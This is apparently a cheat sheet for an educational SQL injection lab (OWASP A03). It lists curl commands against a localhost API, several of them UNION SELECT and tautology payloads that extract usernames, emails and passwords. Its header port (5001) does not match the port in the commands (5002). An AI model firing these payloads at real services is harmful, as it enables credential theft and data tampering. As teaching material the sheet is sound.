A03 - Injection (SQL Injection) - Sample Curl Commands
======================================================

Server: python A03_Example_Injection.py
Port: 5001

# Test normal functionality:
curl http://localhost:5002/api/user/1
curl http://localhost:5002/api/user/2
curl http://localhost:5002/api/user/3
curl http://localhost:5002/api/user/4

# Test SQL injection attacks (EDUCATIONAL PURPOSES ONLY):
curl 'http://localhost:5002/api/user/1%20UNION%20SELECT%201,username,password,role%20FROM%20users--'
curl 'http://localhost:5002/api/user/1'\''%20OR%20'\''1'\''='\''1'
curl 'http://localhost:5002/api/user/999%20UNION%20SELECT%201,2,3,4--'

# Test error-based injection:
curl http://localhost:5002/api/user/abc
curl 'http://localhost:5002/api/user/1'\'''

# Extract all user data:
curl 'http://localhost:5002/api/user/1%20UNION%20SELECT%20id,username,email,password%20FROM%20users--'

# Vulnerability: Direct SQL query construction without parameterization
# Impact: Database contents can be extracted, modified, or deleted
